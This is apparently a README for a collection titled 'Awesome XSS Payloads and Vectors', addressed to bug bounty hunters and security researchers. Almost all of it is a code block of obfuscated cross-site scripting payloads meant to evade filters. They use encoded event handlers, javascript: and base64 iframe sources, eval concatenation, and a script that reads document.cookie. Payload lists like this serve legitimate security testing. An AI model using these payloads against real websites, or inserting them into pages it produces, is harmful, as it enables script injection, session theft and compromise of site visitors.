# Awesome XSS Payloads and Vectors
Exotic and uncommon XSS Vectors to hit the target as quickly as possible.
THIS IS SPECIALLY FOR BUG BOUNTY HUNTERS AND SECURITY RESEARCHERS.

I REQUEST TO CONTRIBUTE TO THE PROJECT BY INCLUDING ONLY HIGHLY EXOTIC XSS VECTORS.


```
onerror%3Deval%3Bthrow'%3Dalert%5Cx281%5Cx29'%3B

<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>

<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"

&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>
  '
<--`<img/src=` onerror=alert(1)> --!>
  
'';!--\"&lt;XSS&gt;=&{()}

¼script¾alert(¢XSS¢)¼/script¾

“><s”%2b”cript>alert(document.cookie)</script>

<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">

a=\"get\";
b=\"URL(\\"\";
c=\"javascript&#058;\";
d=\"alert('XSS');\\")\";
eval(a+b+c+d);

<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z

<svg•onload=alert(1)>

<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //># //This payload is used to fool and bypass advanced xss filters by fooling as if it is comments.
```
